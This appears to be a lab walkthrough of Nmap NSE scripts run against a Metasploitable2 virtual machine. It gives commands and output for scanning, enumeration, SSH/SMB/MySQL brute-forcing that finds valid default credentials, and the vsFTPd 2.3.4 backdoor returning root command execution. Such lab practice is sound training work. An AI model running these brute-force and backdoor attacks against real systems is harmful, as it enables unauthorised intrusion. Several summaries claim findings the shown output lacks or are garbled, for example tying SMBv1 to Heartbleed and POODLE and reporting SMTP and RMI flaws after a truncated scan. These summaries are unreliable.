# NMAP SCRIPTING ENGINE(NSE) 
### We can find the pre install tolls in kali linux in -- ```bash cd /usr/share/```
### Scripts of Nmap : ```bash cd /usr/share/nmap/scripts/``` 
### Target IP: 172.16.6.128

## 1. Service Detection

### Banner Grabbing
**Ports:** 21 (FTP), 22 (SSH), 80 (HTTP), 443 (HTTPS)

**Command:**
```bash
nmap --script=banner -p 21,22,80,443 172.16.6.128
```
**Output:**
```
┌──(durjoy㉿Kali)-[/usr/share/nmap/scripts]
└─$ nmap --script=banner -p 21,22,80,443 172.16.6.128 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 10:24 +06
Nmap scan report for 172.16.6.128
Host is up (0.0034s latency).

PORT    STATE  SERVICE
21/tcp  open   ftp
|_banner: 220 (vsFTPd 2.3.4)
22/tcp  open   ssh
|_banner: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
80/tcp  open   http
443/tcp closed https
MAC Address: 00:0C:29:0E:61:63 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 10.49 seconds
```
**Summary:**
- **FTP (Port 21):** vsFTPd 2.3.4 is running.
- **SSH (Port 22):** OpenSSH 4.7p1 Debian-8ubuntu1 is running.
- **HTTP (Port 80):** Service is running, but no banner was retrieved.
- **HTTPS (Port 443):** Port is closed.

---

### FTP Service Detection
**Port:** 21 (FTP)

**Command:**
```bash
nmap --script=ftp-bounce,ftp-syst -p 21 172.16.6.128
```
**Output:**
```
┌──(durjoy㉿Kali)-[/usr/share/nmap/scripts]
└─$ nmap --script=ftp-bounce,ftp-syst -p 21 172.16.6.128
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 10:25 +06
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Nmap scan report for 172.16.6.128
Host is up (0.00049s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 172.16.6.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
MAC Address: 00:0C:29:0E:61:63 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds
```
**Summary:**
- **FTP (Port 21):** vsFTPd 2.3.4 is running.
- **FTP Bounce:** Not supported (500 Illegal PORT command).
- **FTP Status:** Plain text connections, session timeout of 300 seconds.

---

### SSH Service Detection
**Port:** 22 (SSH)

**Command:**
```bash
nmap --script=ssh-hostkey,ssh2-enum-algos -p 22 172.16.6.128
```
**Output:**
```
┌──(durjoy㉿Kali)-[/usr/share/nmap/scripts]
└─$ nmap --script=ssh-hostkey,ssh2-enum-algos -p 22 172.16.6.128
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 10:25 +06
Nmap scan report for 172.16.6.128
Host is up (0.00048s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
MAC Address: 00:0C:29:0E:61:63 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
```
**Summary:**
- **SSH (Port 22):** OpenSSH 4.7p1 Debian-8ubuntu1 is running.
- **SSH Host Key:** DSA and RSA keys are present.

---

### HTTP Service Detection
**Ports:** 80 (HTTP), 443 (HTTPS)

**Command:**
```bash
nmap --script=http-headers,http-server-header -p 80,443 172.16.6.128
```
**Output:**
```
┌──(durjoy㉿Kali)-[/usr/share/nmap/scripts]
└─$ nmap --script=http-headers,http-server-header -p 80,443 172.16.6.128
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 10:26 +06
Nmap scan report for 172.16.6.128
Host is up (0.00046s latency).

PORT    STATE  SERVICE
80/tcp  open   http
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
```
**Summary:**
- **HTTP (Port 80):** Apache/2.2.8 (Ubuntu) with PHP/5.2.4-2ubuntu5.10 is running.
- **HTTPS (Port 443):** Port is closed.

---

### SMB Service Detection
**Ports:** 139 (NetBIOS), 445 (SMB)

**Command:**
```bash
nmap --script=smb-os-discovery,smb-protocols -p 139,445 172.16.6.128
```
**Output:**
```
┌──(durjoy㉿Kali)-[/usr/share/nmap/scripts]
└─$ nmap --script=smb-os-discovery,smb-protocols -p 139,445 172.16.6.128 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 10:26 +06
Nmap scan report for 172.16.6.128
Host is up (0.00041s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:0E:61:63 (VMware)
```
**Summary:**
- **SMB (Ports 139/445):** Samba 3.0.20-Debian is running.
- **OS:** Unix (Samba 3.0.20-Debian).
- **SMB Protocol:** SMBv1 is enabled (dangerous but default). like Heartbleed or POODLE.

## 2. Vulnerability Detection

### Command:
```bash
nmap --script=vuln 172.16.6.128
```

### Output:
```
Nmap scan report for 172.16.6.128
Host is up (0.0020s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2011-2523  BID:48539
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03

|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload
|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload
|   /admin/jscript/upload.html: Lizard Cart/Remote File upload
|_  /webdav/: Potentially interesting folder
MAC Address: 00:0C:29:0E:61:63 (VMware)

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 327.02 seconds
```

### Summary:
- **FTP (Port 21)**: vsFTPd 2.3.4 is vulnerable to a backdoor exploit (CVE-2011-2523).
- **SMTP (Port 25)**: Vulnerable to SSL/TLS issues like POODLE and weak Diffie-Hellman groups.
- **HTTP (Port 80)**: Multiple vulnerabilities detected, including SQL injection and Slowloris.
- **SMB (Ports 139/445)**: No critical vulnerabilities found.
- **RMI (Port 1099)**: Vulnerable to remote code execution via class loading.

---

## FTP Vulnerability Detection

### Command:
```bash
nmap --script=ftp-vuln* -p 21 172.16.6.128
```

### Output:
```
Nmap scan report for 172.16.6.128
Host is up (0.00048s latency).
PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 00:0C:29:0E:61:63 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
```

### Summary:
- **FTP (Port 21)**: No additional vulnerabilities detected beyond the backdoor.

---

## SMB Vulnerability Detection

### Command:
```bash
nmap --script=smb-vuln* -p 139,445 172.16.6.128
```

### Output:
```
Nmap scan report for 172.16.6.128
Host is up (0.00049s latency).
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:0E:61:63 (VMware)

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-061: false

Nmap done: 1 IP address (1 host up) scanned in 5.99 seconds
```

### Summary:
- **SMB (Ports 139/445)**: No critical vulnerabilities found.

---

## SSL/TLS Vulnerability Detection

### Command:
```bash
nmap --script=ssl-* -p 443 172.16.6.128
```

### Output:
```
Nmap scan report for 172.16.6.128
Host is up (0.00055s latency).
PORT    STATE  SERVICE
443/tcp closed https
MAC Address: 00:0C:29:0E:61:63 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
```

### Summary:
- **HTTPS (Port 443)**: Port is closed, so no SSL/TLS vulnerabilities detected.

  

## 3. Enumeration

### HTTP Directory Enumeration
**Ports:** 80 (HTTP), 443 (HTTPS)

**Command:**
```bash
nmap --script=http-enum -p 80,443 172.16.6.128
```

**Output:**
```plaintext
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:03 +06
Nmap scan report for 172.16.6.128
Host is up (0.00052s latency).

PORT    STATE  SERVICE
80/tcp  open   http
| http-enum: 
|   /tikiwiki/: Tikiwiki
|   /test/: Test page
|   /phpinfo.php: Possible information file
|   /phpMyAdmin/: phpMyAdmin
|   /doc/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) dav/2'
|   /icons/: Potentially interesting folder w/ directory listing
|_  /index/: Potentially interesting folder
443/tcp closed https
MAC Address: 00:0C:29:0E:61:63 (VMware)
```

**Summary:**
- **HTTP (Port 80):** Discovered several directories and files:
  - `/tikiwiki/`: Tikiwiki installation.
  - `/test/`: Test page.
  - `/phpinfo.php`: Possible PHP information file.
  - `/phpMyAdmin/`: phpMyAdmin installation.
  - `/doc/`: Directory listing enabled.
  - `/icons/`: Directory listing enabled.
  - `/index/`: Potentially interesting folder.
- **HTTPS (Port 443):** Closed.

---

### SMB Share Enumeration
**Ports:** 139 (NetBIOS), 445 (SMB)

**Command:**
```bash
nmap --script=smb-enum-shares -p 139,445 172.16.6.128
```

**Output:**
```plaintext
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:03 +06
Nmap scan report for 172.16.6.128
Host is up (0.00043s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:0E:61:63 (VMware)

Host script results:
| smb-enum-shares: 
|   account_used: <blank>
|   \\172.16.6.128\ADMIN$: No anonymous access.
|   \\172.16.6.128\IPC$: Allows anonymous READ/WRITE access.
|   \\172.16.6.128\opt: No anonymous access.
|   \\172.16.6.128\print$: No anonymous access.
|   \\172.16.6.128\tmp: Allows anonymous READ/WRITE access.
```

**Summary:**
- **SMB (Ports 139/445):** Discovered multiple shares:
  - `ADMIN$`: No anonymous access.
  - `IPC$`: Allows anonymous READ/WRITE access.
  - `opt`: No anonymous access.
  - `print$`: No anonymous access.
  - `tmp`: Allows anonymous READ/WRITE access.

---

### DNS Enumeration
**Port:** 53 (DNS)

**Command:**
```bash
nmap --script=dns-brute -p 53 172.16.6.128
```

**Output:**
```plaintext
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:03 +06
Nmap scan report for 172.16.6.128
Host is up (0.00045s latency).

PORT   STATE SERVICE
53/tcp open  domain
MAC Address: 00:0C:29:0E:61:63 (VMware)

Host script results:
|_dns-brute: Can't guess domain of "172.16.6.128"; use dns-brute.domain script argument.
```

**Summary:**
- **DNS (Port 53):** Script requires a domain for brute-forcing.

---

### SNMP Enumeration
**Port:** 161 (SNMP)

**Command:**
```bash
nmap --script=snmp-info -p 161 172.16.6.128
```

**Output:**
```plaintext
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:03 +06
Nmap scan report for 172.16.6.128
Host is up (0.00047s latency).

PORT    STATE  SERVICE
161/tcp closed snmp
MAC Address: 00:0C:29:0E:61:63 (VMware)
```

**Summary:**
- **SNMP (Port 161):** Port is closed, no information retrieved.

---

### MySQL Enumeration
**Port:** 3306 (MySQL)

**Command:**
```bash
nmap --script=mysql-enum -p 3306 172.16.6.128
```

**Output:**
```plaintext
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:03 +06
Nmap scan report for 172.16.6.128
Host is up (0.00042s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-enum: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
MAC Address: 00:0C:29:0E:61:63 (VMware)
```

**Summary:**
- **MySQL (Port 3306):** No valid accounts found during enumeration.

---

## Conclusion
This section covers enumeration tasks using Nmap NSE scripts. The key findings include:
- **HTTP (Port 80):** Multiple directories and files discovered, including Tikiwiki and phpMyAdmin.
- **SMB (Ports 139/445):** Several shares found, with some allowing anonymous access.
- **DNS (Port 53):** Script requires a domain to perform brute-forcing.
- **SNMP (Port 161):** Port is closed, no information retrieved.
- **MySQL (Port 3306):** No valid accounts found.






## 4. Authentication and Brute-Force

### FTP Anonymous Login Check
**Port:** 21 (FTP)

**Command:**
```bash
nmap --script=ftp-anon -p 21 172.16.6.128
```

**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:05 +06
Nmap scan report for 172.16.6.128
Host is up (0.00047s latency).

PORT   STATE SERVICE
21/tcp open  ftp
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
MAC Address: 00:0C:29:0E:61:63 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
```
**Summary:** FTP (Port 21) allows anonymous login (FTP code 230).

---

### SSH Brute-Force
**Port:** 22 (SSH)

**Command:**
```bash
nmap --script=ssh-brute -p 22 172.16.6.128
```

**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:05 +06
NSE: [ssh-brute] Trying username/password pair: root:root
NSE: [ssh-brute] Trying username/password pair: admin:admin
...
Summary: SSH (Port 22): No valid credentials found.
```
---

### HTTP Form Brute-Force
**Ports:** 80 (HTTP), 443 (HTTPS)

**Command:**
```bash
nmap --script=http-form-brute -p 80,443 172.16.6.128
```

**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:06 +06
Nmap scan report for 172.16.6.128
Host is up (0.00048s latency).

PORT    STATE  SERVICE
80/tcp  open   http
443/tcp closed https
MAC Address: 00:0C:29:0E:61:63 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
```
**Summary:** HTTP (Port 80) - No brute-force results; HTTPS (Port 443) - Closed.

---


### SMB Brute-Force
**Ports:** 139 (NetBIOS), 445 (SMB)

**Command:**
```bash
nmap --script=smb-brute -p 139,445 172.16.6.128
```

**Output:**
```plaintext
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:07 +06
Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Nmap scan report for 172.16.6.128
Host is up (0.00040s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:0E:61:63 (VMware)

Host script results:
| smb-brute: 
|   msfadmin:msfadmin => Valid credentials
|_  user:user => Valid credentials

Nmap done: 1 IP address (1 host up) scanned in 268.06 seconds
```

**When to Use:** To brute-force SMB credentials and identify valid user accounts.

---

### MySQL Brute-Force
**Port:** 3306 (MySQL)

**Command:**
```bash
nmap --script=mysql-brute -p 3306 172.16.6.128
```

**Output:**
```plaintext
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:07 +06
Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Nmap scan report for 172.16.6.128
Host is up (0.00018s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-brute: 
|   Accounts: 
|     root:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|_  Statistics: Performed 40013 guesses in 167 seconds, average tps: 201.5
MAC Address: 00:0C:29:0E:61:63 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 167.38 seconds
```

**When to Use:** To brute-force MySQL credentials and identify valid database accounts.


## 5. Exploitation

### FTP Backdoor Exploitation
**Port:** 21 (FTP)

**Command:**
```bash
nmap --script=ftp-vsftpd-backdoor -p 21 172.16.6.128
```

**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:08 +06
Nmap scan report for 172.16.6.128
Host is up (0.00017s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  BID:48539  CVE:CVE-2011-2523
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|_References: CVE-2011-2523
MAC Address: 00:0C:29:0E:61:63 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.32 seconds
```
**Summary:** FTP (Port 21) - The vsFTPd 2.3.4 backdoor is exploitable.

---

### SMB MS17-010 (EternalBlue) Exploitation
**Ports:** 139 (NetBIOS), 445 (SMB)

**Command:**
```bash
nmap --script=smb-vuln-ms17-010 -p 139,445 172.16.6.128
```

**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:08 +06
Nmap scan report for 172.16.6.128
Host is up (0.00011s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:0E:61:63 (VMware)
```
**Summary:** No MS17-010 (EternalBlue) vulnerability detected.

---

### HTTP Shellshock Exploitation
**Ports:** 80 (HTTP), 443 (HTTPS)

**Command:**
```bash
nmap --script=http-shellshock -p 80,443 172.16.6.128
```

**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:08 +06
Nmap scan report for 172.16.6.128
Host is up (0.00013s latency).

PORT    STATE  SERVICE
80/tcp  open   http
443/tcp closed https
MAC Address: 00:0C:29:0E:61:63 (VMware)
```
**Summary:** No Shellshock vulnerability detected.

---

### Telnet Exploitation
**Port:** 23 (Telnet)

**Command:**
```bash
nmap --script=telnet-encryption -p 23 172.16.6.128
```

**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:08 +06
Nmap scan report for 172.16.6.128
Host is up (0.00011s latency).

PORT   STATE SERVICE
23/tcp open  telnet
| telnet-encryption: 
|_  Telnet server does not support encryption
```
**Summary:** Telnet (Port 23) - No encryption support, vulnerable to sniffing attacks.

---

## Conclusion
- **FTP:** Anonymous login allowed, backdoor exploit confirmed.
- **SSH:** No valid credentials found.
- **HTTP:** No Shellshock vulnerability.
- **SMB:** No MS17-010 vulnerability.
- **Telnet:** Lacks encryption, vulnerable to sniffing attacks.





## 6. Network Discovery

### Broadcast Ping
**Command:**
```bash
nmap --script=broadcast-ping 172.16.6.128
```
**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:36 +06
Nmap scan report for 172.16.6.128
Host is up (0.0013s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
MAC Address: 00:0C:29:0E:61:63 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 4.02 seconds
```
**Note:** The broadcast-ping script discovered multiple open ports on the target system, including FTP, SSH, HTTP, and SMB. This indicates that the host is running several services that could be potential attack vectors.

---

### UPnP Discovery
**Port:** 1900 (UPnP)

**Command:**
```bash
nmap --script=broadcast-upnp-info -p 1900 172.16.6.128
```
**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:36 +06
Nmap scan report for 172.16.6.128
Host is up (0.00038s latency).

PORT     STATE  SERVICE
1900/tcp closed upnp
MAC Address: 00:0C:29:0E:61:63 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.37 seconds
```
**Note:** The UPnP service is closed on the target system, indicating that no UPnP devices are discoverable.

---

### NetBIOS Discovery
**Port:** 137 (NetBIOS)

**Command:**
```bash
nmap --script=nbstat -p 137 172.16.6.128
```
**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:36 +06
Nmap scan report for 172.16.6.128
Host is up (0.00046s latency).

PORT    STATE  SERVICE
137/tcp closed netbios-ns
MAC Address: 00:0C:29:0E:61:63 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
```
**Note:** The NetBIOS service is closed, meaning no NetBIOS information is available from the target.

---

### SNMP Discovery
**Port:** 161 (SNMP)

**Command:**
```bash
nmap --script=snmp-brute -p 161 172.16.6.128
```
**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:37 +06
Nmap scan report for 172.16.6.128
Host is up (0.00042s latency).

PORT    STATE  SERVICE
161/tcp closed snmp
MAC Address: 00:0C:29:0E:61:63 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
```
**Note:** The SNMP service is closed, so no SNMP information could be retrieved.











## 7. Data Extraction

### HTTP Title Extraction
**Ports:** 80 (HTTP), 443 (HTTPS)

**Command:**
```bash
nmap --script=http-title -p 80,443 172.16.6.128
```

**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:37 +06
Nmap scan report for 172.16.6.128
Host is up (0.00044s latency).

PORT    STATE  SERVICE
80/tcp  open   http
|_http-title: Metasploitable2 - Linux
443/tcp closed https
MAC Address: 00:0C:29:0E:61:63 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
```

**Note:** The HTTP service is running, and the title of the web page is "Metasploitable2 - Linux." This indicates the target is likely a vulnerable system for testing purposes.

---

### SMB User Enumeration
**Ports:** 139 (NetBIOS), 445 (SMB)

**Command:**
```bash
nmap --script=smb-enum-users -p 139,445 172.16.6.128
```

**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:37 +06
Nmap scan report for 172.16.6.128
Host is up (0.00039s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:0E:61:63 (VMware)

Host script results:
| smb-enum-users: 
|   METASPLOITABLE\msfadmin (RID: 3000)
|     Full name:   msfadmin,,,
|     Flags:       Normal user account
|   METASPLOITABLE\user (RID: 3002)
|     Full name:   just a user,111,,
|     Flags:       Normal user account
|   (Other disabled accounts omitted for brevity)
|_  Flags:       Account disabled, Normal user account

Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
```

**Note:** The SMB service is running, and multiple user accounts were enumerated. Notably, `msfadmin` and `user` are active accounts, while others are disabled.

---

### MySQL Database Enumeration
**Port:** 3306 (MySQL)

**Command:**
```bash
nmap --script=mysql-databases -p 3306 172.16.6.128
```

**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:37 +06
Nmap scan report for 172.16.6.128
Host is up (0.00038s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
MAC Address: 00:0C:29:0E:61:63 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
```

**Note:** The MySQL service is running, but no databases were enumerated. Further investigation is required to identify accessible databases.

---

### SNMP System Information
**Port:** 161 (SNMP)

**Command:**
```bash
nmap --script=snmp-sysdescr -p 161 172.16.6.128
```

**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 11:37 +06
Nmap scan report for 172.16.6.128
Host is up (0.00045s latency).

PORT    STATE  SERVICE
161/tcp closed snmp
MAC Address: 00:0C:29:0E:61:63 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
```

**Note:** The SNMP service is closed, so no system information could be retrieved.

